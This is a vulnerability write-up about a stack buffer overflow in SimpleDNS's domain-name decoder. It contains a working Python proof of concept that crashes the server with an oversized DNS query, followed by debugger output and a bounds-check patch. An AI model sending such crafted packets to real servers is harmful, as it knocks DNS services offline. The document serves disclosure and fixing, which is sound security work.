# SimpleDNS

So this is a dns server from: `https://github.com/mwarning/SimpleDNS`.

Checkout `https://youtu.be/I-pqPThkB4g` if you want more info from this.

So this has a bug, which is in the `decode_domain_name function`:

```
// 3foo3bar3com0 => foo.bar.com
char* decode_domain_name(const uint8_t** buffer)
{
  char name[256];
  const uint8_t* buf = *buffer;
  int j = 0;
  int i = 0;

  while (buf[i] != 0) {
    //if (i >= buflen || i > sizeof(name))
    //  return NULL;

    if (i != 0) {
      name[j] = '.';
      j += 1;
    }

    int len = buf[i];
    i += 1;

    memcpy(name+j, buf+i, len);
    i += len;
    j += len;
  }

  name[j] = '\0';

  *buffer += i + 1; //also jump over the last 0

  return strdup(name);
}
```

The bug is with the `memcpy` call. It is copying into a fixed length stack buffer `name`, of size `256`. The size is from the dns query for the QNAME, which specifies the size of an octet. Now this value is a single byte integer (so max value `255`). This loop will copy each octet individually. There are two indices that it keeps track of, one for the `name` buffer, and another for the dns QNAME. Every time it scans in another octet, it moves the index for the `name` buffer forward equal to the length of the octet. Since it is only `256` bytes big, using multiple octets, it is possible to write past the end of the bounds, and cause a stack overflow.

Here is some poc code that I wrote for it:

```
import socket

if __name__ == "__main__":
    #print("poc")
    conn = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    conn.connect(("127.0.0.1", 9000))


    ID = b"\x12\x23"
    FLAGS = b"\x01\x00"
    QDCOUNT = b"\x00\x01"
    ANCOUNT = b"\x00\x00"
    NSCOUNT = b"\x00\x00"
    ARCOUNT = b"\x00\x00"

    HEADER = ID + FLAGS + QDCOUNT + ANCOUNT + NSCOUNT + ARCOUNT

    QNAME = b"\xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff\xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff\x00"
    QTYPE = b"\x00\x01"
    QCLASS = b"\x00\x01"

    QUESTION = QNAME + QTYPE + QCLASS

    PACKET = HEADER + QUESTION

    conn.send(PACKET)
```

When we run the server:

```
$    gdb ./main
GNU gdb (Ubuntu 9.1-0ubuntu1) 9.1
Copyright (C) 2020 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
GEF for linux ready, type `gef' to start, `gef config' to configure
87 commands loaded for GDB 9.1 using Python engine 3.8
[*] 5 commands could not be loaded, run `gef missing` to know why.
Reading symbols from ./main...
(No debugging symbols found in ./main)
gef➤  r
Starting program: /Hackery/not_ready_to_die/SimpleDNS/vuln/main
Listening on port 9000.
```

Send the poc in a separate terminal:
```
$    python3 poc.py
```

We see that we get a stack overflow:
```
*** stack smashing detected ***: terminated

Program received signal SIGABRT, Aborted.
__GI_raise (sig=sig@entry=0x6) at ../sysdeps/unix/sysv/linux/raise.c:50
50    ../sysdeps/unix/sysv/linux/raise.c: No such file or directory.

[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x0               
$rbx   : 0x00007ffff7fb7540  →  0x00007ffff7fb7540  →  [loop detected]
$rcx   : 0x00007ffff7e0a18b  →  <raise+203> mov rax, QWORD PTR [rsp+0x108]
$rdx   : 0x0               
$rsp   : 0x00007fffffffd3d0  →  0x0000000000000000
$rbp   : 0x00007fffffffd750  →  0x00007ffff7f7e07c  →  "*** %s ***: terminated\n"
$rsi   : 0x00007fffffffd3d0  →  0x0000000000000000
$rdi   : 0x2               
$rip   : 0x00007ffff7e0a18b  →  <raise+203> mov rax, QWORD PTR [rsp+0x108]
$r8    : 0x0               
$r9    : 0x00007fffffffd3d0  →  0x0000000000000000
$r10   : 0x8               
$r11   : 0x246             
$r12   : 0x00007fffffffd650  →  0x0000000000000000
$r13   : 0x20              
$r14   : 0x00007ffff7ffb000  →  0x202a2a2a00001000
$r15   : 0x1               
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000
────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffd3d0│+0x0000: 0x0000000000000000     ← $rsp, $rsi, $r9
0x00007fffffffd3d8│+0x0008: 0x00000000001c16a0
0x00007fffffffd3e0│+0x0010: 0x00000000001c16a0
0x00007fffffffd3e8│+0x0018: 0x0000003000000008
0x00007fffffffd3f0│+0x0020: 0x00007fffffffd920  →  "ffffffffffffffffffffffffffffffffffffffffffffffffff[...]"
0x00007fffffffd3f8│+0x0028: 0x00007fffffffd860  →  "ffffffffffffffffffffffffffffffffffffffffffffffffff[...]"
0x00007fffffffd400│+0x0030: 0x0000000000000010
0x00007fffffffd408│+0x0038: 0x0000000400000001
──────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x7ffff7e0a17f <raise+191>      mov    edi, 0x2
   0x7ffff7e0a184 <raise+196>      mov    eax, 0xe
   0x7ffff7e0a189 <raise+201>      syscall
 → 0x7ffff7e0a18b <raise+203>      mov    rax, QWORD PTR [rsp+0x108]
   0x7ffff7e0a193 <raise+211>      xor    rax, QWORD PTR fs:0x28
   0x7ffff7e0a19c <raise+220>      jne    0x7ffff7e0a1c4 <__GI_raise+260>
   0x7ffff7e0a19e <raise+222>      mov    eax, r8d
   0x7ffff7e0a1a1 <raise+225>      add    rsp, 0x118
   0x7ffff7e0a1a8 <raise+232>      ret    
──────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "main", stopped 0x7ffff7e0a18b in __GI_raise (), reason: SIGABRT
────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x7ffff7e0a18b → __GI_raise(sig=0x6)
[#1] 0x7ffff7de9859 → __GI_abort()
[#2] 0x7ffff7e543ee → __libc_message(action=do_abort, fmt=0x7ffff7f7e07c "*** %s ***: terminated\n")
[#3] 0x7ffff7ef6b4a → __GI___fortify_fail(msg=0x7ffff7f7e064 "stack smashing detected")
[#4] 0x7ffff7ef6b16 → __stack_chk_fail()
[#5] 0x555555555c8d → decode_domain_name()
─────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  bt
#0  __GI_raise (sig=sig@entry=0x6) at ../sysdeps/unix/sysv/linux/raise.c:50
#1  0x00007ffff7de9859 in __GI_abort () at abort.c:79
#2  0x00007ffff7e543ee in __libc_message (action=action@entry=do_abort, fmt=fmt@entry=0x7ffff7f7e07c "*** %s ***: terminated\n") at ../sysdeps/posix/libc_fatal.c:155
#3  0x00007ffff7ef6b4a in __GI___fortify_fail (msg=msg@entry=0x7ffff7f7e064 "stack smashing detected") at fortify_fail.c:26
#4  0x00007ffff7ef6b16 in __stack_chk_fail () at stack_chk_fail.c:24
#5  0x0000555555555c8d in decode_domain_name ()
#6  0x6666666666666666 in ?? ()
#7  0x6666666666666666 in ?? ()
#8  0x6666666666666666 in ?? ()
#9  0x6666666666666867 in ?? ()
.    .    .
```

So to patch it, I made several changes. Effectively I added a check, to see if there will be an overflow. On Top of that, I made some changes to the functions that call `decode_domain_name` in order to see if there is an overflow issue, and deal with it, but you can checkout the patched code if you want to see that:

```
// 3foo3bar3com0 => foo.bar.com
char* decode_domain_name(const uint8_t** buffer)
{
  char name[256];
  const uint8_t* buf = *buffer;
  int j = 0;
  int i = 0;

  while (buf[i] != 0) {
    //if (i >= buflen || i > sizeof(name))
    //  return NULL;

    if (i != 0) {
      name[j] = '.';
      j += 1;
    }

    int len = buf[i];
    i += 1;

    if ((j + len) >= 256) {
      // OVERFLOW ISSUE
      return OVERFLOW_QNAME;
    }

    memcpy(name+j, buf+i, len);
    i += len;
    j += len;
  }

  name[j] = '\0';

  *buffer += i + 1; //also jump over the last 0

  return strdup(name);
}
```

And when we run the patched version, we see that the poc is no longer effective at crashing it.
